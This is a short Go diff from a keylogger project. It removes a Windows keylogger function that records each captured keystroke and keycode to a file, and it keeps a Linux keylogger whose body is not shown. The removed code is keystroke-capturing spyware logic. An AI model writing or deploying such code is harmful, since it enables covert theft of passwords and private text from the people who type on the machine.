@@ -5,7 +5,6 @@ import (
 	"fmt"
 	"github.com/mateusmaaia/keylogo/linux/keylogger"
 	"github.com/mateusmaaia/keylogo/linux/mapping"
-	"github.com/mateusmaaia/keylogo/windows"
 	"github.com/sirupsen/logrus"
 	"os"
 	"regexp"
@@ -24,25 +23,6 @@ func main() {
 
 	runtime.Goexit()
 	fmt.Println("Stopping keylogger")
-}
-
-func WindowsKeyLogger() {
-	kl := windows.NewKeylogger()
-	emptyCount := 0
-	f := openOrCreateFile("windows")
-
-	for {
-
-		key := kl.GetKey()
-
-		if !key.Empty {
-			f.WriteString(fmt.Sprintln("'%c' %d n", key.Rune, key.Keycode))
-		}
-
-		emptyCount++
-
-		time.Sleep(1 * time.Millisecond)
-	}
 }
 
 func LinuxKeylogger() {
